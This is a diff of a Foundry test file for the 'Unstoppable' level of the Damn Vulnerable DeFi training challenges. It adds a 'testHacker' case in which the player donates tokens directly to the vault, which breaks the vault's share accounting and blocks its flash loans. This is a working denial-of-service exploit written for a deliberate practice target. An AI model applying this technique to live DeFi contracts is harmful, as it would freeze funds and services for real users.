@@ -6,10 +6,9 @@ import {DamnValuableToken} from "../src/DamnValuableToken.sol";
 import {UnstoppableVault} from "../src/unstoppable/UnstoppableVault.sol";
 import {ReceiverUnstoppable} from "../src/unstoppable/ReceiverUnstoppable.sol";
 
-contract CounterTest is Test {
+contract UnstopableTest is Test {
     DamnValuableToken public token;
     UnstoppableVault vault;
-    ReceiverUnstoppable receiverContract;
 
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -18,20 +17,26 @@ contract CounterTest is Test {
     uint256 TOKENS_IN_VAULT = 1000000 ether;
     uint256 INITIAL_PLAYER_TOKEN_BALANCE = 10 ether;
 
-    function setUp() public {
-        vm.startPrank(deployer);
+    modifier excuteByUser(address _user) {
+        vm.startPrank(_user);
+        _;
+        vm.stopPrank();
+    }
 
+    function setUp() public excuteByUser(deployer) {
         token = new DamnValuableToken();
         vault = new UnstoppableVault(token, deployer, deployer);
 
         token.approve(address(vault), TOKENS_IN_VAULT);
         vault.deposit(TOKENS_IN_VAULT, deployer);
 
+        // 检查金库资产
         assertEq(address(vault.asset()), address(token));
+        // 检查金库余额
         assertEq(token.balanceOf(address(vault)), TOKENS_IN_VAULT);
-        // 资金库持有的标的资产总量
+        // 检查金库持有的标的资产总量
         assertEq(vault.totalAssets(), TOKENS_IN_VAULT);
-        // 流通中未赎回的资金库份额总数
+        // 检查流通中未赎回的金库份额总数
         assertEq(vault.totalSupply(), TOKENS_IN_VAULT);
         assertEq(vault.maxFlashLoan(address(token)), TOKENS_IN_VAULT);
         assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT - 1), 0);
@@ -40,16 +45,33 @@ contract CounterTest is Test {
             (TOKENS_IN_VAULT * 0.05 ether) / 1e18
         );
 
+        // start with 10 DVT tokens
         token.transfer(player, INITIAL_PLAYER_TOKEN_BALANCE);
         assertEq(token.balanceOf(player), INITIAL_PLAYER_TOKEN_BALANCE);
-
-        // Show it's possible for someUser to take out a flash loan
-        receiverContract = new ReceiverUnstoppable(someUser);
-        vm.expectRevert();
-        receiverContract.executeFlashLoan(100 ether);
-
-        vm.stopPrank();
     }
 
-    function test_Increment() public {}
+    function testSomeOne() public excuteByUser(someUser) {
+        // Show it's possible for someUser to take out a flash loan
+        ReceiverUnstoppable receiverContract = new ReceiverUnstoppable(
+            address(vault)
+        );
+        receiverContract.executeFlashLoan(100 ether);
+    }
+
+    function testHacker() public excuteByUser(player) {
+        ReceiverUnstoppable receiverContract = new ReceiverUnstoppable(
+            address(vault)
+        );
+
+        token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE);
+
+        uint256 totalSupply = vault.totalSupply();
+        uint256 totalAssets = vault.totalAssets();
+        console.log("totalSupply:", totalSupply / 1e18);
+        console.log("totalAssets:", totalAssets / 1e18);
+        console.log("share:", vault.convertToShares(totalSupply) / 1e18);
+
+        vm.expectRevert(UnstoppableVault.InvalidBalance.selector);
+        receiverContract.executeFlashLoan(100 ether);
+    }
 }
